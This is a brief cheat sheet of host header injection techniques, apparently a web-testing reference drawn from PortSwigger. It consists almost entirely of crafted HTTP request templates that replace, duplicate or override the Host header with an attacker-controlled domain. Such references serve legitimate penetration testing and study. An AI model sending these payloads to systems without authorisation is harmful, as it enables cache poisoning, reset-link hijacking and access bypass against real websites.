# Host Header Injection

1. Change the host header
```
GET /index.php HTTP/1.1
Host: evil-website.com
...
```
2. Duplicating the host header
```
GET /index.php HTTP/1.1
Host: vulnerable-website.com
Host: evil-website.com
...
```
3. Add line wrapping
```
GET /index.php HTTP/1.1
 Host: vulnerable-website.com
Host: evil-website.com
...
```
4. Add host override headers
```
X-Forwarded-For : evil-website.com
X-Forwarded-Host : evil-website.com
X-Client-IP : evil-website.com
X-Remote-IP : evil-website.com
X-Remote-Addr : evil-website.com
X-Host : evil-website.com
```
How to use? In this case im using "X-Forwarded-For : evil.com"
```
GET /index.php HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-For : evil-website.com
...
```
5. Supply an absolute URL
```
GET https://vulnerable-website.com/ HTTP/1.1
Host: evil-website.com
...
```
Source: https://portswigger.net/web-security/host-header/exploiting
